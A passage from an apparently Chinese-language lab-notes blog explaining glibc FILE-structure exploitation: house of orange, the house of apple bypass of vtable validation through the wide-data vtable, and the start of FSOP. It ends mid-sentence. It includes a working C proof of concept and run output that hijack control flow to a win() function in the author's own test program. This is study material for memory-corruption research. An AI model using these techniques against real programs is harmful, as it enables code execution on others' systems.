<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test<span class="meta"># gcc orange.c -o orange -no-pie -g -no-pie -w</span></span><br><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test# ./orange</span><br><span class="line">fake_vtable @ <span class="number">0x1690010</span></span><br><span class="line">fp @ <span class="number">0x1690530</span></span><br><span class="line">vtable_ptr = <span class="number">0x1690608</span></span><br><span class="line">original vtable_addr = <span class="number">0x7fd1b3f3c6e0</span></span><br><span class="line">new vtable_addr = <span class="number">0x1690010</span></span><br><span class="line">function win called</span><br><span class="line">function win called</span><br></pre></td></tr></table></figure>
<p>同样的代码对于更高版本的<code>glibc</code>无效</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test]</span><br><span class="line">└─# ./orange</span><br><span class="line">fake_vtable @ <span class="number">0x123e2a0</span></span><br><span class="line">fp @ <span class="number">0x123e7c0</span></span><br><span class="line">vtable_ptr = <span class="number">0x123e898</span></span><br><span class="line">original vtable_addr = <span class="number">0x7f4da32ca070</span></span><br><span class="line">new vtable_addr = <span class="number">0x123e2a0</span></span><br><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>
<h3 id="house-of-apple-glibc-2.23">[house of apple @ glibc &gt;
2.23]</h3>
<p>针对虚表的攻击通常能够想到两种方式</p>
<p>1.保持虚表地址不变,修改虚表上的函数指针</p>
<p>2.造假虚表,然后修改虚表指针</p>
<p>对于1来说,虚表位于<code>glibc</code>的代码段,通常是只读的,不允许随便改函数指针</p>
<p>对于2来说,<code>glibc2.23</code>之前是可以劫持虚表指针的,相关攻击方法叫做<code>house of orange</code></p>
<p><code>glibc2.24</code>之后就加入了虚表的合法性检查</p>
<p>但也不是不能利用了，新方法叫<code>house of apple</code></p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L398</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/glibc/glibc-2.24/source/libio/libioP.h#L133</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure>
<p><code>IO_validate_vtable</code>会检查虚表的合法性</p>
</blockquote>
<p><strong>这个虚表合法性检查会发生在何时呢?</strong></p>
<p><code>fwrite</code>实际上调用<code>_IO_fwrite</code>,<code>if</code>判断通过,会执行<code>__IO_sputn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)	<span class="comment">//</span></span><br><span class="line">  written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);	<span class="comment">//</span></span><br></pre></td></tr></table></figure>
<p>这里<code>_IO_sputn</code>是一个宏定义,会在检查<code>vtable</code>合法性之后调用<code>vtable.xsputn</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp,__s,__n) _IO_XSPUTN (__fp, __s, __n)</span></span><br><span class="line">扩展到:</span><br><span class="line">((IO_validate_vtable ((*(__typeof__ (((<span class="keyword">struct</span> _IO_FILE_plus)&#123;&#125;).vtable) *)(((<span class="type">char</span> *) ((fp))) + __builtin_offsetof(<span class="keyword">struct</span> _IO_FILE_plus, vtable)))))-&gt;__xsputn) (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>同理,不管<code>fread</code>还是<code>fwrite</code>实际上都会在经过<code>vtable</code>合法性检查后,调用<code>vtable</code>中的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>虚表合法性检查了什么呢?</strong></p>
<p>而<code>IO_validate_vtable</code>会检查虚表是否是<code>glibc</code>预定义好的虚表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ptr = vtable</code>是<code>FILE</code>结构的虚表指针</p>
<p><code>const struct _IO_jump_t __io_vtables[]</code>是<code>vtables.c</code>中预定义好的虚表数组</p>
<p>在<code>libioP.h</code>中暴露了这些虚表的引用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> __<span class="title">io_vtables</span>[] <span class="title">attribute_hidden</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_str_jumps                    (__io_vtables[IO_STR_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wstr_jumps                   (__io_vtables[IO_WSTR_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps                   (__io_vtables[IO_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps_mmap              (__io_vtables[IO_FILE_JUMPS_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps_maybe_mmap        (__io_vtables[IO_FILE_JUMPS_MAYBE_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps                  (__io_vtables[IO_WFILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps_mmap             (__io_vtables[IO_WFILE_JUMPS_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps_maybe_mmap       (__io_vtables[IO_WFILE_JUMPS_MAYBE_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_cookie_jumps                 (__io_vtables[IO_COOKIE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_proc_jumps                   (__io_vtables[IO_PROC_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_mem_jumps                    (__io_vtables[IO_MEM_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wmem_jumps                   (__io_vtables[IO_WMEM_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_printf_buffer_as_file_jumps  (__io_vtables[IO_PRINTF_BUFFER_AS_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wprintf_buffer_as_file_jumps (__io_vtables[IO_WPRINTF_BUFFER_AS_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_file_jumps               (__io_vtables[IO_OLD_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_proc_jumps               (__io_vtables[IO_OLD_PROC_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_cookie_jumps             (__io_vtables[IO_OLD_COOKIED_JUMPS])</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IO_VTABLES_LEN (IO_VTABLES_NUM * sizeof (struct _IO_jump_t))</span></span><br><span class="line">IO_VTABLES_NUM = <span class="number">14</span></span><br><span class="line"><span class="keyword">sizeof</span> (<span class="keyword">struct</span> _IO_jump_t) = <span class="number">168</span></span><br><span class="line">IO_VTABLES_LEN = <span class="number">14</span>*<span class="number">168</span> = <span class="number">2352</span></span><br></pre></td></tr></table></figure>
<p>也就是说一共有14个预定义的虚表</p>
<p>通常情况下使用的虚表是<code>_IO_file_jumps = __io_vtables[IO_FILE_JUMPS]</code></p>
<p><code>IO_validate_vtable</code>检查虚表<strong>必须是这14个其中之一</strong>,防止被用户劫持篡改指向了堆栈或者堆</p>
<p><strong>如何绕过虚表检查呢?</strong></p>
<p>当fread函数被调用时,调用过程是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread</span><br><span class="line">	_IO_sgetn</span><br><span class="line">		_IO_XSGETN</span><br><span class="line">			JUMP2</span><br><span class="line">				_IO_JUMPS_FUNC</span><br><span class="line">=&gt;					IO_validate_vtable </span><br><span class="line">						_IO_JUMPS_FILE_plus</span><br></pre></td></tr></table></figure>
<p><code>IO_validate_vtable</code>是必然被调用的,检查的是<code>_IO_FILE_plus.vtable</code></p>
<p>然而在<code>_IO_XSGETN</code>宏定义这里还有一个兄弟叫<code>_IO_WXSGETN</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.38/libio/libioP.h:184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure>
<p>这个兄弟宏定义展开发现是没有<code>_IO_validate_vtable</code>这种检查的,会直接调用到<code>_IO_FILE._wide_data-&gt;_wide_vtable</code>中的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_WXSGETN</span><br><span class="line">	WJUMP2</span><br><span class="line">		_IO_WIDE_JUMPS_FUNC</span><br><span class="line">			_IO_WIDE_JUMPS</span><br><span class="line">				_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span><br></pre></td></tr></table></figure>
<p>也就是说劫持<code>_wide_vtable</code>虚表指针是不会被检查的</p>
<p>而<code>_wide_data</code>结构体位于<code>libc</code>的只读内存区中,无法修改其中的<code>_wide_vtable</code>,因此还需要伪造一个<code>_wide_data</code></p>
<p>并且只劫持<code>_wide_vtable</code>还不够,因为正常情况下控制流是绝对不会进入任何一个宽字节相关函数的</p>
<p>所以还需要把<code>_IO_FILE_plus.vtable</code>改成<code>IO_WFILE_JUMPS</code></p>
<p>最后再调用一个<code>fwrite</code></p>
<p>接下来控制流是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fwrite</span><br><span class="line">	=&gt; vtable+0x38</span><br><span class="line">		=&gt; _IO_wfile_xsputn</span><br><span class="line">			=&gt; _IO_wdefault_xsputn @ glibc/libio/wgenops.c</span><br><span class="line">				=&gt; __woverflow</span><br><span class="line">					=&gt; vtable+0x18</span><br><span class="line">						=&gt; _IO_wfile_overflow</span><br><span class="line">							=&gt; _IO_wdoallocbuf</span><br><span class="line">								=&gt; _IO_WDOALLOCATE (wide_data.wide_vtable+0x68 =&gt; win )</span><br></pre></td></tr></table></figure>
<p><strong>总结</strong></p>
<p>总的来说,需要干这么几步:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span><br><span class="line">1.构造fake_wide_vtable,在其中填充目标函数(关键是+0x68位置)</span><br><span class="line">2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针吗,指向1中构造的fake_wide_vtable</span><br><span class="line">3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) // ~(0x800 | 0x8 | 0x2)</span><br><span class="line">4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span><br><span class="line">5.修改FILE._wide_data指向2中构造的fake_wide_data</span><br><span class="line">6.fwrite触发house of apple</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里复位了三个<code>flag</code>,各自的作用是:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span>		<span class="comment">//2.必须有写权限</span></span><br><span class="line"> &#123;</span><br><span class="line">   f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">   __set_errno (EBADF);</span><br><span class="line">   <span class="keyword">return</span> WEOF;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>		<span class="comment">//1.不能是_IO_CURRENTLY_PUTTING,这样就会进入本if从而调用到_IO_wdoallocbuf</span></span><br><span class="line">   || f-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">   <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);</span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_doallocbuf (f);</span><br><span class="line">	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))		<span class="comment">//_IO_UNBUFFERED必须等于0才会进入本if,调用到_IO_WDOALLOCATE</span></span><br><span class="line"> <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">_IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>写个poc意思意思</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.构造fake_wide_vtable,使用win填充</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针,指向1中构造的fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.修改FILE._wide_data指向2中构造的fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.trigger house of apple</span></span><br><span class="line">    fwrite(buffer,<span class="number">1</span>,<span class="number">100</span>,fp);</span><br><span class="line"></span><br><span class="line">    fclose(fp); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基于<code>glibc2.38</code>做实验,<code>win</code>函数被调用了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# gcc apple.c -o apple -g -no-pie -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./apple</span><br><span class="line">function printf @ 0x7f7e72eba110</span><br><span class="line">_IO_wfile_jumps @ 0x7f7e7303b268</span><br><span class="line">function win called</span><br></pre></td></tr></table></figure>
<h3 id="fsop">FSOP</h3>
<p>上集说到,<code>house of apple</code>在构造好了<code>FILE</code>之后,还要对其进行一个<code>fwrite</code>等操作触发到<code>_IO_wfile_overflow</code>函数</p>
<p>在本集中,<strong>不需要</strong>调用<code>fwrite</code>等操作,也可以触发,相关攻击方式叫做<code>FSOP(File Structure Oriented Programming)</code></p>
<p>程序退出时,会有这么一条调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">	_run_exit_handlers</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all</span><br><span class="line">				_IO_OVERFLOW</span><br><span class="line">					vtable + 0x18 =&gt; _IO_file_overflow</span><br></pre></td></tr></table></figure>
<p>这个<code>_IO_flush_all</code>中会把<code>_IO_list_all</code>上挂着的都尝试一下<code>_IO_OVERFLOW</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">   &#123;</span><br><span class="line">     run_fp = fp;</span><br><span class="line">     _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">     _IO_funlockfile (fp);</span><br><span class="line">     run_fp = <span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这里能够执行<code>_IO_OVERFLOW</code>的条件是下式为真</p>
